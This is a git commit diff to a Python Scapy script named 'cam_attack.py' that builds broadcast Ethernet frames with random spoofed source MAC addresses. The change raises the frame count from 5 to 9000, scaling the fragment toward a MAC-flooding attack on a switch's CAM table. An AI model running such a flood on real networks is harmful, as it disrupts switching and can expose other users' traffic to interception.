9699f90528a12d4c64887c14882917f0972b347a
Youssef <37754072+yoyokoyo@users.noreply.github.com>
2018-11-18 21:05:52 +0100

    Update cam_attack.py

--- cam_attack.py
+++ cam_attack.py
@@ -2,7 +2,7 @@
 from scapy.all import *
 import random,string
 
-for i in range(5):
+for i in range(9000):
         trame = Ether()
         trame.dst = 'ff:ff:ff:ff:ff:ff'
         MAC_src_fake_list = [''.join(random.choice('abcdef' + string.digits) for _ in range(2)) for i in range(6)]
